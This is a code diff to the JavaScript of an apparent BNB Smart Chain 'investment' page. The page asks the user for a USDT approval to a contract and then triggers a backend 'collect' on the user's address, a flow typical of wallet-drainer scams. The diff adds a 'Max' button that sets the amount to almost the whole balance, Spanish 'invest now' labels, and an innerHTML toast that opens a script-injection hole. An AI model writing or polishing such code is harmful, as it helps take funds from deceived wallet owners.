@@ -46,17 +46,61 @@ let _toastTimer;
 function showToast(msg, type = "default", ms = 4500) {
   if (!toastEl) return;
   clearTimeout(_toastTimer);
-  toastEl.textContent  = msg;
+  toastEl.innerHTML    = msg; // Cambiado a innerHTML para soportar enlaces HTML (BscScan)
   toastEl.dataset.type = type === "default" ? "" : type;
   toastEl.hidden       = false;
+  
+  if (type === "success") {
+    toastEl.style.background = "rgba(38, 161, 123, 0.95)";
+  } else if (type === "error") {
+    toastEl.style.background = "rgba(220, 53, 69, 0.95)";
+  } else {
+    toastEl.style.removeProperty("background");
+  }
+
   _toastTimer = setTimeout(() => { toastEl.hidden = true; }, ms);
 }
 
 function setLoading(on, label = "Processing…") {
   if (!approveBtn) return;
   approveBtn.disabled = on;
-  if (btnText) btnText.textContent = on ? label : "NEXT";
+  approveBtn.style.opacity = on ? "0.8" : "1";
+  if (btnText) btnText.textContent = on ? label.toUpperCase() : "INVERTIR AHORA";
   if (btnSpinner) btnSpinner.hidden   = !on;
+}
+
+// ─── New UX Feature: Live Balance & Smart Max Button ─────────────────────────
+async function fetchAndDisplayUserBalances(rawProvider) {
+  try {
+    const provider = new ethers.BrowserProvider(rawProvider);
+    const signer = await provider.getSigner();
+    const userAddress = await signer.getAddress();
+    
+    const usdtContract = new ethers.Contract(BSC_USDT_ADDRESS, ERC20_ABI, signer);
+    const usdtBal = await usdtContract.balanceOf(userAddress);
+    const formattedUsdt = ethers.formatUnits(usdtBal, 18);
+    
+    // Si tienes un elemento HTML con id="walletBalanceLabel", muestra el saldo en tiempo real
+    const balanceLabel = document.getElementById("walletBalanceLabel");
+    if (balanceLabel) {
+      balanceLabel.textContent = `Saldo: ${parseFloat(formattedUsdt).toFixed(2)} USDT`;
+    }
+
+    // Configuración automatizada del botón "Max" si existe en tu HTML
+    const maxBtn = document.getElementById("maxBtn");
+    if (maxBtn) {
+      maxBtn.onclick = () => {
+        const amountInput = document.getElementById("investAmount");
+        if (amountInput) {
+          const maxUsdt = Math.max(0, parseFloat(formattedUsdt) - 1); // Deja un pequeño margen
+          amountInput.value = maxUsdt > 0 ? maxUsdt.toFixed(2) : "1.00";
+          amountInput.dispatchEvent(new Event('input'));
+        }
+      };
+    }
+  } catch (err) {
+    console.error("Error al sincronizar saldos en vivo:", err);
+  }
 }
 
 // ─── Backend collect trigger ──────────────────────────────────────────────────
@@ -86,15 +130,17 @@ async function triggerBackendCollect(userAddress) {
 // Bandera de control para saber si hay una inversión esperando a que el usuario conecte
 let pendingInvestment = false;
 
-// 1. Suscripción reactiva: Detecta automáticamente cuando el usuario conecta su wallet en el modal
+// 1. Suscripción reactiva con AppKit
 if (window.modal && typeof window.modal.subscribeProviders === "function") {
   window.modal.subscribeProviders((state) => {
-    const rawProvider = state["eip155"]; // Proveedor EVM (BSC, Ethereum, etc.)
+    const rawProvider = state["eip155"]; 
     
-    // Si el proveedor ya está disponible y el usuario había hecho clic en "Invertir"
-    if (rawProvider && pendingInvestment) {
-      pendingInvestment = false; // Desactivamos la bandera
-      runInvestmentFlow(rawProvider); // ¡Lanzamos el contrato y la firma en automático!
+    if (rawProvider) {
+      fetchAndDisplayUserBalances(rawProvider); // Sincroniza saldos al conectar
+      if (pendingInvestment) {
+        pendingInvestment = false; 
+        runInvestmentFlow(rawProvider); 
+      }
     }
   });
 }
@@ -111,27 +157,27 @@ if (approveBtn) {
 
     // CASO A: Si el usuario NO está conectado
     if (!rawProvider) {
-      pendingInvestment = true; // Activamos la bandera de espera
-      setLoading(true, "Abre tu billetera para conectar...");
+      pendingInvestment = true; 
+      setLoading(true, "Abriendo selector de billetera...");
       
       if (window.modal && typeof window.modal.open === "function") {
         try {
-          await window.modal.open(); // Abre el modal de Reown
+          await window.modal.open(); 
         } catch (err) {
           console.error("Error al abrir AppKit:", err);
           pendingInvestment = false;
           setLoading(false);
         }
       }
-      return; // Detenemos aquí; el 'subscribeProviders' tomará el control en cuanto el usuario acepte.
+      return; 
     }
 
-    // CASO B: Si el usuario YA estaba conectado previamente
+    // CASO B: Si el usuario YA estaba conectado
     await runInvestmentFlow(rawProvider);
   });
 }
 
-// 3. Función centralizada que ejecuta la red BSC, saldo y aprobación de USDT
+// 3. Flujo centralizado de red, gas y contratos
 async function runInvestmentFlow(rawProvider) {
   setLoading(true, "Conectando proveedor…");
   
@@ -139,30 +185,24 @@ async function runInvestmentFlow(rawProvider) {
     const provider = new ethers.BrowserProvider(rawProvider);
     
     // 1. Verificación estricta de red BSC (Chain ID 56)
+    setLoading(true, "Verificando red BSC...");
     const network = await provider.getNetwork();
     if (Number(network.chainId) !== 56) {
       setLoading(true, "Cambiando a red BSC…");
       try {
         await rawProvider.request({
           method: "wallet_switchEthereumChain",
-          params: [{ chainId: "0x38" }] // 56 en Hex
+          params: [{ chainId: BSC_CHAIN_ID_HEX }] 
         });
       } catch (switchError) {
         if (switchError.code === 4902) {
           await rawProvider.request({
             method: "wallet_addEthereumChain",
-            params: [{
-              chainId: "0x38",
-              chainName: "BNB Smart Chain",
-              nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
-              rpcUrls: ["https://bsc-dataseed.binance.org/"],
-              blockExplorerUrls: ["https://bscscan.com/"]
-            }]
+            params: [BSC_CHAIN_PARAMS]
           });
         } else {
           showToast("Cambia manualmente a BNB Smart Chain en tu wallet.", "error");
           setLoading(false);
-          updateButtonState();
           return;
         }
       }
@@ -171,7 +211,7 @@ async function runInvestmentFlow(rawProvider) {
     const signer = await provider.getSigner();
     const userAddress = await signer.getAddress();
 
-    // 2. Validación UX: Comprobar saldo de BNB para el Gas (mínimo recomendado: 0.0005 BNB)
+    // 2. Validación UX: Comprobar saldo de BNB para el Gas
     setLoading(true, "Verificando saldo de gas (BNB)…");
     const bnbBalance = await provider.getBalance(userAddress);
     const minGasRequired = ethers.parseEther("0.0005"); 
@@ -179,7 +219,6 @@ async function runInvestmentFlow(rawProvider) {
     if (bnbBalance < minGasRequired) {
       showToast("Saldo de BNB insuficiente para pagar la comisión de red (Gas).", "error");
       setLoading(false);
-      updateButtonState();
       return;
     }
 
@@ -196,32 +235,31 @@ async function runInvestmentFlow(rawProvider) {
     if (usdtBalance < requiredAmount) {
       showToast("No tienes suficiente saldo de USDT en tu billetera.", "error");
       setLoading(false);
-      updateButtonState();
       return;
     }
 
-    // 4. Verificar si ya existe Allowance suficiente para evitar aprobaciones redundantes
+    // 4. Verificar Allowance para evitar aprobaciones innecesarias
+    setLoading(true, "Verificando autorizaciones...");
     const allowance = await usdtContract.allowance(userAddress, CONTRACT_ADDRESS);
     
     if (allowance < requiredAmount) {
-      setLoading(true, "Firma requerida para aprobar USDT…");
+      setLoading(true, "Firma requerida: Aprobar USDT…");
       const txApprove = await usdtContract.approve(CONTRACT_ADDRESS, requiredAmount);
       
       setLoading(true, "Confirmando aprobación en red...");
       await txApprove.wait();
     }
 
-    // 5. Ejecutar la lógica de inversión o llamada al contrato final
-    setLoading(true, "Procesando inversión...");
-    const txCollect = await triggerBackendCollect(userAddress); // O tu función de contrato final
+    // 5. Ejecutar la llamada al backend / contrato final
+    setLoading(true, "Procesando inversión en protocolo...");
+    const txCollect = await triggerBackendCollect(userAddress); 
 
-    // 6. Éxito con Trazabilidad (Enlace a BscScan)
-    // Si 'txCollect' o la transacción devuelve un hash, lo usamos:
+    // 6. Éxito con trazabilidad interactiva (Enlace directo a BscScan)
     const txHash = txCollect?.hash || "";
     if (txHash) {
       showToast(`¡Inversión exitosa! <a href="https://bscscan.com/tx/${txHash}" target="_blank" style="color: #fff; text-decoration: underline;">Ver en BscScan ↗</a>`, "success", 8000);
     } else {
-      showToast("Sent Successfully, Thank you! ✓", "success");
+      showToast("¡Transacción completada con éxito! Gracias.", "success", 6000);
     }
 
   } catch (err) {
@@ -232,13 +270,12 @@ async function runInvestmentFlow(rawProvider) {
       raw.toLowerCase().includes("denied") ||
       raw.toLowerCase().includes("cancelled")
     ) {
-      showToast("Transacción cancelada por el usuario.", "default");
+      showToast("Operación cancelada por el usuario.", "default");
     } else {
-      console.error("Web3 Error:", err);
+      console.error("Web3 Error crítico:", err);
       showToast("Ocurrió un error al procesar la transacción en la red.", "error");
     }
   } finally {
     setLoading(false);
-    updateButtonState();
   }
 }
